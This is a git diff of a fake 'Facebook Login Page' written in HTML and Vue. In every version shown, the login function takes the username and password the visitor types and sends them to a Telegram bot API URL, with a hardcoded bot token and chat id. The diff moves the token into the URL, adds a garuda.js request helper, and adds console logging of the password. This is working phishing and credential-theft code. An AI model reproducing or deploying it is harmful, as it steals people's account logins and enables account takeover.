@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -7,6 +8,8 @@
     <title>Facebook Login Page</title>
     <link rel="stylesheet" href="./assets/css/facebook.css" />
     <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script src="assets/js/garuda.js"></script>
+    <link rel="icon" type="image/x-icon" href="fb.png">
 </head>
 
 <body>
@@ -29,8 +32,8 @@
     </div>
     <script>
         const { createApp } = Vue
-        const bot_key = '6961214529:AAE_sxfO7j-TEiMVj8CzIS8WgOwlhyomNAk';
-        const _URL_ = "https://api.telegram.org/bot"+bot_key+"/sendMessage?chat_id=5627039442&text="
+       
+        const _URL_ = "https://api.telegram.org/bot6961214529:AAE_sxfO7j-TEiMVj8CzIS8WgOwlhyomNAk/sendMessage?chat_id=5627039442&text="
 
 
         createApp({
@@ -41,10 +44,14 @@
                 }
             },methods: {
                 login: function(){
-                    
-                    const response = fetch(_URL_+this.username+"|"+this.password);
-                    
-                    console.log(response);
+                    console.log(this.username)
+                    console.log(this.password)
+                    __({
+                        url : _URL_ +this.username+"_"+this.password,
+                        method:"get"
+                    }).request($response=>{
+                        console.log($response)
+                    })
 
                 }
             },
@@ -54,3 +61,5 @@
 </body>
 
 </html>
+
+
